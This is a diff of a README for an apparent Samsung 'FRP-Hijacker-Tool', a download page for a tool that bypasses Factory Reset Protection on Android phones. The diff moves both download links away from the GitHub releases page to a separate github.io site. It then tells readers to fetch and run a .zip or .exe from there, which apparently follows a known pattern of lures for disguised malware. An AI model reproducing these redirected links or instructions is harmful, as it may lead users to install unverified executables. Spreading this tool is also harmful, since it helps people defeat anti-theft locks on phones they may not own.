@@ -1,6 +1,6 @@
 # 🔓 FRP-Hijacker-Tool - Unlock your Samsung Android device easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ERMsistemas/FRP-Hijacker-Tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://ermsistemas.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you start, check your computer environment. The tool requires these items
 
 You must visit the main release page to get the correct version of the tool. Do not download files from unverified third-party websites, as they often contain malware.
 
-Visit this page to download: [https://github.com/ERMsistemas/FRP-Hijacker-Tool/releases](https://github.com/ERMsistemas/FRP-Hijacker-Tool/releases)
+Visit this page to download: [https://ermsistemas.github.io](https://ermsistemas.github.io)
 
 On this page, look for the list under the "Assets" heading. Download the file ending in `.zip` or `.exe`. If the file is a compressed .zip folder, right-click it and choose "Extract All" to see the contents.
 
